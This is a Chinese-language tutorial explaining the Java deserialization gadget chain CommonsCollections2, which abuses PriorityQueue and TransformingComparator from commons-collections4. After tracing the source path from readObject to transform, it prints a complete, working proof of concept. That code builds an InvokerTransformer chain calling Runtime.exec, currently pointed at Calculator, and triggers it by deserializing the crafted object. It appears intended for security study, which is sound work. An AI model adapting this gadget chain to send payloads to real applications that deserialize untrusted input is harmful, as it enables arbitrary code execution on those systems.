java反序列化CommonCollections2

不同于之前的几条利用链的是，CommonCollections2要在Common-Collections4下才能生效。Common-Collections4和之前用到的Common-Collections3.2.1并不冲突，可以存在于同一个项目中。

PriorityQueue利用链

CommonCollections中找利用链的思想是找一条从被序列化类的readObject方法中找出能调用transform方法的调用链。而在CommonCollections2中，我们用的这个被序列化的类是java.util.PriorityQueue。我们先来看一下这个类的readObject方法：

private void readObject(java.io.ObjectInputStream s)
       throws java.io.IOException, ClassNotFoundException {
       // Read in size, and any hidden stuff
       s.defaultReadObject();

       // Read in (and discard) array length
       s.readInt();

       SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
       queue = new Object[size];

       // Read in all elements.
       for (int i = 0; i < size; i++)
           queue[i] = s.readObject();

       // Elements are guaranteed to be in "proper order", but the
       // spec has never explained what that might be.
       heapify();
   }

似乎没有可以让我们直接使用的transform。这里我们先直接给出最后调用到transform的地方，位于org.apache.commons.collections4.comparators.TransformingComparator的compare方法中：

public int compare(I obj1, I obj2) {
       O value1 = this.transformer.transform(obj1);
       O value2 = this.transformer.transform(obj2);
       return this.decorated.compare(value1, value2);
   }

那么它们是怎样连接起来的呢？这里我们就要聊一下PriorityQueue了

java.util.PriorityQueue是一个基于二叉堆实现的优先队列。二叉堆是一种特殊的堆，二叉堆是完全二叉树或者是近似完全二叉树。二叉堆有两种：最大堆和最小堆。最大堆：父结点的键值总是大于或等于任何一个子节点的键值；最小堆：父结点的键值总是小于或等于任何一个子节点的键值。这样就使得每个元素都有了自己的优先级。

那么反序列化时为什么要调用一个heapify()方法，这个方法又是干什么的呢？ heapify方法对数组进行调整，使得它符合二叉堆的规范或者特点。而在readObject中调用它就是为了在反序列化之后能保证整个结构的顺序。

private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}

这里只调用了一个方法，siftDown(),这个方法的作用是将结点下移（排序是靠将大的节点下移实现的）。而这个方法又会调用一个siftDownUsingComparator方法。

private void siftDownUsingComparator(int k, E x) {
       int half = size >>> 1;
       while (k < half) {
           int child = (k << 1) + 1;
           Object c = queue[child];
           int right = child + 1;
           if (right < size &&
               comparator.compare((E) c, (E) queue[right]) > 0)
               c = queue[child = right];
           if (comparator.compare(x, (E) c) <= 0)
               break;
           queue[k] = c;
           k = child;
       }
       queue[k] = x;
   }

在这个方法中是实现了排序的代码。这里的comparator.compare就是来比较两个节点大小的。

说到这里，我们就不得不提一下比较器了。比较器涉及了一种java设计模式——Strategy设计模式（策略设计模式），这里我们不展开说。对于比较器而言，其实就是把不同比较策略的算法封装到实现了Comparator接口的类当中。客户在调用的时候可以根据自己的需求选择。

这里我们看一下这个比较器是哪来的：

public PriorityQueue(int initialCapacity,
                         Comparator<? super E> comparator) {
        // Note: This restriction of at least one is not actually needed,
        // but continues for 1.5 compatibility
        if (initialCapacity < 1)
            throw new IllegalArgumentException();
        this.queue = new Object[initialCapacity];
        this.comparator = comparator;
    }

在PriorityQueue的构造函数中我们可以看到这个comparator是调用者传进去的。其实PriorityQueue有很多个构造函数，我这里贴出这个构造函数是因为待会我们要使用的就是这个。

现在我们再回看之前给出的org.apache.commons.collections4.comparators.TransformingComparator，其实它就是一个实现了Comparator的类，是不是有种恍然大明白的感觉。这里我们只需把它传入PriorityQueue的构造函数中。不就能通过其compare方法顺利调用了transform吗？

下面我们给出POC：

Transformer这块还是和CommomCollections1一样，这里我们需要把transformerchain传入到TransformingComparator中

Comparator comparator = new TransformingComparator(transformerChain);

然后就是实例化PriorityQueue，这里我们用到的是上面提到的那个构造函数。

PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

我们这里传入了两个参数，第二个是触发漏洞的comparator，那么第一个参数又是什么呢？我们观察之前的构造函数可以看到，第一个参数其实是创建初始数组的长度。我们这里传入2，是因为只有在元素个数大于等于2的时候才会触发比较。后面随意添加两个非null的对象进去即可。其实我们传入的这两个对象最后会被当作参数传入compare方法，随后传入到我们要触发的transform中。

那么这样会不会影响到我们POC链的执行呢？我们回顾一下之前的内容：这里的transformer是我们传进去的transformerChain，

public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }
        return object;
    }

这里又会把这个参数传入到第一个Transformer的transform方法中，即ConstantTransformer的transformer，我们看一下：

public Object transform(Object input) {
        return this.iConstant;
    }

传入的参数在这里并不会有任何的影响。

最后的POC：

package com.govuln.deserialization;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

public class CommonsCollections2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] { "/System/Applications/Calculator.app/Contents/MacOS/Calculator" }),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
